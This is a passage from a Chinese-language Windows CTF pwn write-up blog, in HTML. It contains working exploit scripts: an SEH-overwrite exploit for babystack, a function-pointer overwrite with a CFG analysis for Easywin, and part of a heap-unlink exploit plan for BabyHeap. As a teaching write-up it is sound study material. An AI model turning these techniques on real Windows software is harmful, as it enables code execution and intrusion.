class="number">0x1460</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babystack.exe"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote('node3.buuoj.cn', 26510)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"stack address = 0x"</span>)</span><br><span class="line">stack_address = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">cookie_address = stack_address + <span class="number">0x80</span></span><br><span class="line">p.recvuntil(<span class="string">"main address = 0x"</span>)</span><br><span class="line">main_address = int(p.recv(<span class="number">6</span>), <span class="number">16</span>)</span><br><span class="line">target_address = main_address - main + target</span><br><span class="line">__security_cookie_address = main_address - main + __security_cookie_offset</span><br><span class="line">backdoor_address = main_address - main + backdoor</span><br><span class="line">exception_handler = main_address - main + handler</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak cookie</span></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Where do you want to know"</span>, str(cookie_address))</span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">cookie = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak __security_cookie</span></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">"yes"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Where do you want to know"</span>, str(__security_cookie_address))</span><br><span class="line">p.recvuntil(<span class="string">"value is 0x"</span>)</span><br><span class="line">__security_cookie = int(p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake scope table</span></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">"go"</span>)</span><br><span class="line">payload = <span class="string">"AAAA"</span> </span><br><span class="line"><span class="comment"># | __security_cookieCookieOffset | __security_cookieCookieXorOffset | EHCookieOffset | EHCookieXorOffset |</span></span><br><span class="line">payload += p32(<span class="number">0xffffffe4</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0xffffff20</span>) + p32(<span class="number">0</span>) </span><br><span class="line"><span class="comment"># | EnclosingLevel | FilterFunc | HandlerFunc |</span></span><br><span class="line">payload += p32(<span class="number">0xfffffffe</span>) + p32(<span class="number">0</span>) + p32(backdoor_address)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>) <span class="comment"># padding</span></span><br><span class="line">payload += p32(cookie) <span class="comment"># cookie</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># padding</span></span><br><span class="line"><span class="comment"># | next | exception_handler | scope_table ^ security_cookie | TryLevel |</span></span><br><span class="line">payload += p32(stack_address + <span class="number">0xd4</span>) + p32(exception_handler) + p32(__security_cookie ^ (stack_address + <span class="number">4</span>)) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to know more?"</span>, <span class="string">'yes'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Where do you want to know"</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Windows-Insomni’hack-Teaser-2017-Easywin"><a href="#Windows-Insomni’hack-Teaser-2017-Easywin" class="headerlink" title="[Windows][Insomni’hack Teaser 2017]Easywin"></a>[Windows][Insomni’hack Teaser 2017]Easywin</h1><h2 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先winchecksec一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  winchecksec.exe .\easywin.exe</span><br><span class="line">Results for: .\easywin.exe</span><br><span class="line">Dynamic Base    : &quot;Present&quot;</span><br><span class="line">ASLR            : &quot;Present&quot;</span><br><span class="line">High Entropy VA : &quot;Present&quot;</span><br><span class="line">Force Integrity : &quot;NotPresent&quot;</span><br><span class="line">Isolation       : &quot;Present&quot;</span><br><span class="line">NX              : &quot;Present&quot;</span><br><span class="line">SEH             : &quot;Present&quot;</span><br><span class="line">CFG             : &quot;Present&quot;</span><br><span class="line">RFG             : &quot;NotPresent&quot;</span><br><span class="line">SafeSEH         : &quot;NotApplicable&quot;</span><br><span class="line">GS              : &quot;Present&quot;</span><br><span class="line">Authenticode    : &quot;NotPresent&quot;</span><br><span class="line">.NET            : &quot;NotPresent&quot;</span><br></pre></td></tr></table></figure><p>需要注意的是这里开启了CFG保护，至于CFG保护的原理后文会提到。</p><p>题目逻辑比较简单，主要是<code>add</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Type?\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" d - Droideka\n b - B1 Battle Droid\n p - Probe Droid\n i - IG-88\n~~~~~~~~~~~~~~~~~~~~~~\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>, v9);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> (v9[<span class="number">0</span>] == <span class="string">'b'</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span> (v9[<span class="number">0</span>])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">            strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] A Droideka lands on %1$s (%2$d, %3$d).\n"</span>);</span><br><span class="line">            *((_QWORD *)v5 + <span class="number">64</span>) = func_msg1;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'i'</span>:</span><br><span class="line">            strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] IG-88 has a bounty of %$2d%$3d$ on planet %$1s.\n"</span>);</span><br><span class="line">            *((_QWORD *)v5 + <span class="number">64</span>) = func_msg2;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">            strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] Probe Droid arrived on planet %$1s after %$2d days and %$3d hours...\n"</span>);</span><br><span class="line">            *((_QWORD *)v5 + <span class="number">64</span>) = func_msg3;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_30;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Invalid type.\n"</span>);</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy_s(v5 + <span class="number">256</span>, <span class="number">0x100</span>ui64, <span class="string">"[+] An army of %$3d%$2d B1 Battle Droid arrives on %$1s.\n"</span>);</span><br><span class="line">    *((_QWORD *)v5 + <span class="number">64</span>) = func_msg4;</span><br><span class="line">LABEL_30:;</span><br><span class="line">&#125; <span class="keyword">while</span> (v8);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>这里在偏移0x200的位置放置了一个函数指针，在<code>attack</code>功能中会被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( v5 &amp;&amp; *(_QWORD *)(v2 + <span class="number">512</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    v8 = rand() % <span class="number">100</span>;</span><br><span class="line">    v9 = rand();</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">char</span> *)(v2 + <span class="number">0x100</span>), v2, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v9 % <span class="number">100</span>), v8);</span><br><span class="line">    result = (*(__int64 (__fastcall **)(__int64))(v2 + <span class="number">0x200</span>))(v2);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>首先，这个调用的参数正好书buffer本身；其次，其buffer中包含格式化字符串。<br>同时，很容易发现，在<code>edit</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = (__int64)fgets(v0, <span class="number">0x208</span>, v1);</span><br><span class="line"><span class="keyword">if</span> ( v2 )</span><br><span class="line">&#123;</span><br><span class="line">    v2 = <span class="number">-1</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    ++v2;</span><br><span class="line">    <span class="keyword">while</span> ( v0[v2] );</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp;&amp; v0[v2 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">    v0[v2 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是可以写入0x208 bytes数据的，也就是说直接给了一个覆盖函数指针的操作；同时配合<code>attack</code>中的格式化字符串，还可以进行一次leak，需要注意的是，windows下是无法通过”%n”这种操作完成任意地址写的，”$”也无法使用。</p><h2 id="Windows-CFG-Control-Flow-Gaurd"><a href="#Windows-CFG-Control-Flow-Gaurd" class="headerlink" title="Windows CFG(Control Flow Gaurd)"></a>Windows CFG(Control Flow Gaurd)</h2><p>简单来说，CFG通过在间接跳转前插入校验代码，检查目标地址是否合法，从而可以组成程序控制流被劫持到非预期的地方。<br>而从细节上讲，比如：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF6862A17BD                 <span class="keyword">mov</span>     <span class="built_in">rbx</span>, [<span class="built_in">rdi</span>+<span class="number">200h</span>]</span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17C4                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17C7                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__guard_check_icall_fptr</span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17CD                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17D0                 <span class="keyword">call</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF6862A17D2                 <span class="keyword">jmp</span>     short loc_7FF6862A17E3</span><br></pre></td></tr></table></figure><p>这里需要<code>call rbx</code>，不过首先需要通过<code>__guard_check_icall_fptr</code>对<code>rbx</code>的位置进行一个校验。<br>而在win10里，这个<code>__guard_check_icall_fptr</code>的实现其实就是<code>ntdll!LdrpValidateUserCallTarget</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">LdrpValidateUserCallTarget</span><span class="params">(<span class="keyword">unsigned</span> __int64 func_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 bitmap; <span class="comment">// rdx</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 bit_offset; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    bitmap = CFGBitmap[func_addr &gt;&gt; <span class="number">9</span>];</span><br><span class="line">    bit_offset = func_addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (func_addr &amp; <span class="number">0xF</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        bit_offset &amp;= <span class="number">0xFFFFFFFFFFFFFFFE</span>ui64;</span><br><span class="line">        <span class="keyword">if</span> ( !_bittest64(&amp;bitmap, bit_offset) )</span><br><span class="line">            <span class="keyword">return</span> LdrpHandleInvalidUserCallTarget();</span><br><span class="line">LABEL_5:</span><br><span class="line">        bit_offset |= <span class="number">1u</span>i64;</span><br><span class="line">        <span class="keyword">if</span> ( _bittest64(&amp;bitmap, bit_offset) )</span><br><span class="line">            <span class="keyword">return</span> bit_offset;</span><br><span class="line">        <span class="keyword">return</span> LdrpHandleInvalidUserCallTarget();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !_bittest64(&amp;bitmap, bit_offset) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    <span class="keyword">return</span> bit_offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，这个check流程就是：</p><ol><li><p><code>func_addr &gt;&gt; 9</code>得到对应<code>CFGBitmap</code>数组的下标，这里的原因是：</p><ul><li><p><code>CFGBitmap</code>原理是8 bytes对应1 bit，换句话说，就是8 bytes的虚拟地址空间是用<code>CFGBitmap</code>中的1 bit标记的；所以这里需要右移3。</p></li><li><p><code>CFGBitmap</code>数组是以<code>QWORD</code>单位存的，故<code>bitmap</code>也是以8 bytes也就是64 bit取的，进行判断的时候下标最大为<code>2^6-1</code>，即需要6 bit表示下标；所以这里需要右移6。</p></li><li><p>所以最后<code>func_addr &gt;&gt; 9</code>才得到对应<code>CFGBitmap</code>数组的下标。</p><p>综上，被check的<code>func_addr</code>实际上被分为了三个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+------------------+--------+</span><br><span class="line">|       55 bits       |       6 bits     | 3 bits |</span><br><span class="line">+---------------------+------------------+--------+</span><br><span class="line">| offset in CFGBitmap | offset in bitmap |  left  |</span><br><span class="line">+---------------------+------------------+--------+</span><br></pre></td></tr></table></figure></li></ul></li><li><p>如果<code>func_addr</code>的低4 bits不为0，也就是<code>func_addr</code>不是0x10对齐的，就会同时检查两个bit，一个是<code>bit_offset &amp; 0xFFFFFFFFFFFFFFFE</code>，一个是<code>bit_offset | 1</code>，举个例子：</p><ul><li><p>如果<code>func_addr = 0x101</code>，那么检查<code>bitoffset = 0x20</code>以及``bitoffset = 0x21`；</p></li><li><p>如果<code>func_addr = 0x10F</code>，那么检查<code>bitoffset = 0x20</code>以及``bitoffset = 0x21`；</p><p>换句话说，在<code>func_addr</code>没有0x10对齐的情况下，最后判断的相应的<code>bitmap</code>中的bit是同样的，故结果也是同样的。<br>且只有在这两个bit均为1的情况下，才能通过检查，否则都会判为无效，从而转入异常处理，也不会进行跳转。</p></li></ul></li><li><p>如果<code>func_addr</code>的低4 bits为0，也就是<code>func_addr</code>是0x10对齐的，那么会先后检查<code>bit_offset</code>和<code>bit_offset | 1</code>，举个例子：</p><ul><li>如果<code>func_addr = 0x100</code>，那么检查<code>bitoffset = 0x20</code>；如果此时<code>bit_offset</code>对应的bit为0，则再给一次机会，检查<code>bit_offset | 1</code>是否为1；如果为1，那么目标地址有效，否则无效。</li></ul><p>换句话说，在<code>func_addr</code>是0x10对齐的情况下，只要<code>bit_offset</code>或<code>bit_offset | 1</code>的其中一个对应的bit是1，那么目标地址都是有效的。</p></li><li><p>至于为何这里涉及了两个bit的检查，就不得而知了。</p></li></ol><p>而至于CFGBitmap是如何生成的，涉及到比较<a href="http://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf" target="_blank" rel="noopener">复杂的细节</a>。<br>对于动态链接库dll中的一些导出函数，其在<code>CFGBitmap</code>中对应的bit都是共享的，也就是说要么都合法，要么都不合法。<br>而若仅仅针对当前进程，则有几个比较重要的相关结构，在<code>_load_config_usedv</code>中可以看到</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3830                 <span class="built_in">dq</span> offset __guard_check_icall_fptr <span class="comment">; GuardCFCheckFunctionPointer</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3838                 <span class="built_in">dq</span> offset __guard_dispatch_icall_fptr <span class="comment">; GuardCFDispatchFunctionPointer</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3840                 <span class="built_in">dq</span> offset __guard_fids_table <span class="comment">; GuardCFFunctionTable</span></span><br><span class="line"><span class="symbol">.rdata:</span>00007FF6862A3848                 <span class="built_in">dq</span> <span class="number">0Eh</span>                  <span class="comment">; GuardCFFunctionCount</span></span><br></pre></td></tr></table></figure><ul><li><code>__guard_check_icall_fptr</code>：前面已经提到过，实际指向<code>ntdll!LdrpValidateUserCallTarget</code>，做具体的检查。</li><li><code>__guard_dispatch_icall_fptr</code>：实际上就只是<code>jmp rax</code>，不知作何用。</li><li><code>__guard_fids_table</code>：该进程合法的跳转地址，也就是一个函数指针表，在程序加载的时候会完成从该RVA列表到具体CFGBitmap中对应bit的转化。</li><li><code>GuardCFFunctionCount</code>：即RVA列表中函数指针的个数。</li></ul><h2 id="利用思路-4"><a href="#利用思路-4" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先利用上述提到的格式化字符串漏洞，leak出<code>ucrtbase</code>的基地址。注意由于windows程序和linux不一样，其运行的加载基址貌似在相当长的一段时间里是不会变化的（或许是不重启机器就不会变），dll的加载地址也是如此；所以一次leak，全程受用。</li><li>之后利用<code>edit</code>的溢出，覆盖函数指针为<code>system</code>，并布置buffer为”type,pwn\westworld.txt”，调用<code>attack</code>就会将flag打印出来。这里直接<code>system(&quot;cmd.exe&quot;)</code>弹了shell后无法交互，所以只能直接读flag了。<br> 这里还有个点就是，因为我们是没法输入空格的，所以”type flag.txt”这样的字符串是输不进去的，所以利用了一个小小的trick，也就是”type,flag.txt”中”,”在这里可以等同于空格来使用，完成这个bypass。</li><li>这里可以通过调试，跟到<code>LdrpValidateUserCallTarget</code>中进行判断，<code>system</code>确实是合法地址；而至于为什么<code>system</code>是合法地址，这里猜测dll的导出函数可能都会是合法的跳转地址，但是无法进行验证；这样，CFG的保护在这里似乎就没有什么作用了。</li></ol><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easywin.exe"</span>)</span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 27068)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice? "</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content, item)</span>:</span></span><br><span class="line">    choose(<span class="string">'a'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Target planet? "</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">"Type?"</span>, item)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choose(<span class="string">'c'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ID? "</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"New target planet? "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choose(<span class="string">'d'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ID? "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="string">'ll'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add('AAA', 'd')</span></span><br><span class="line"><span class="comment"># edit(0, 'A' * 0xff + '\x00' + "%p" * 5 + "ucrtbase.dll:%p" + context.newline)</span></span><br><span class="line"><span class="comment"># attack()</span></span><br><span class="line"><span class="comment"># p.recvuntil('ucrtbase.dll:')</span></span><br><span class="line"><span class="comment"># ucrtbase = int(p.recv(16), 16) - 0xE59F8</span></span><br><span class="line">ucrtbase =  <span class="number">0x7ffe46b20000</span></span><br><span class="line">system = ucrtbase + <span class="number">0xA40C0</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'AAA'</span>, <span class="string">'d'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'type,pwn\\westworld.txt'</span>.ljust(<span class="number">0x100</span>, <span class="string">"\x00"</span>) + <span class="string">'A'</span> * <span class="number">0xff</span> + <span class="string">"\x00"</span> + p64(system))</span><br><span class="line">attack()</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[+] ucrtbase: "</span> + hex(ucrtbase))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Windows-OGeek2019-BabyHeap-amp-Windows-ASIS-2017-Babyheap"><a href="#Windows-OGeek2019-BabyHeap-amp-Windows-ASIS-2017-Babyheap" class="headerlink" title="[Windows][OGeek2019]BabyHeap &amp; [Windows][ASIS 2017]Babyheap"></a>[Windows][OGeek2019]BabyHeap &amp; [Windows][ASIS 2017]Babyheap</h1><h2 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h2><p>传统的菜单题，其中<code>add</code>，<code>delete</code>和<code>show</code>都没有问题，只有<code>edit</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (chunk_status[dwBytes])</span><br><span class="line">&#123;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And what's the length this time?"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v16) != <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Then name it again : "</span>);</span><br><span class="line">    v11 = v16;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v13 = chunk_array[dwBytes];</span><br><span class="line">    v9 = getchar();</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v9 == <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v13[v4++] = v9;</span><br><span class="line">        v9 = getchar();</span><br><span class="line">    &#125; <span class="keyword">while</span> (v4 != v11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然存在一个heap overflow。</p><h2 id="利用思路-5"><a href="#利用思路-5" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>由于<code>edit</code>功能没有自动在末尾补”\x00”，所以可以通过这个leak出下一个chunk头，它是被Encoding xor加密过的，我们可以通过手动还原出原chunk头然后跟加密过的头进行xor，从而得到Encoding；同样地可以leak出heap地址。因为这个heap是通过<code>hHeap = HeapCreate(1u, 0x2000u, 0x2000u);</code>单独申请的，所以仅供当前线程使用，因此布局可预测，比较简单。</li><li>不同在于，linux下heap overflow通过覆盖fd，来劫持fastbin或者tcache bin的链表，达到任意地址写的目的。windows下的freelist是一个双向链表，所以要通过类似于unsorted bin的unlink attack进行利用，从而获得一个指向自己的指针。</li><li>通过提供的<code>shoot</code>功能，我们要将该chunk对应的<code>chunk_status</code>中的标志置为1，从而使得可写，进而达到任意地址读写的目的。</li><li>有了任意地址读写，就可以利用如下的一条leak链： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IAT &#x3D;&#x3D;&gt; kernel32 &#x3D;&#x3D;&gt; ntdll &#x3D;&#x3D;&gt; ntdll!PebLdr - 0x44 &#x3D;&#x3D;&gt; PEB &#x3D;&#x3D;&gt; TEB &#x3D;&#x3D;&gt; StackBase &#x3D;&#x3D;&gt; return address</span><br></pre></td></tr></table></figure> 从而找到main函数的返回地址在栈上的位置。</li><li>接下来就是覆盖返回地址执行<code>system(&quot;cmd.exe&quot;)</code>了。</li></ol><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 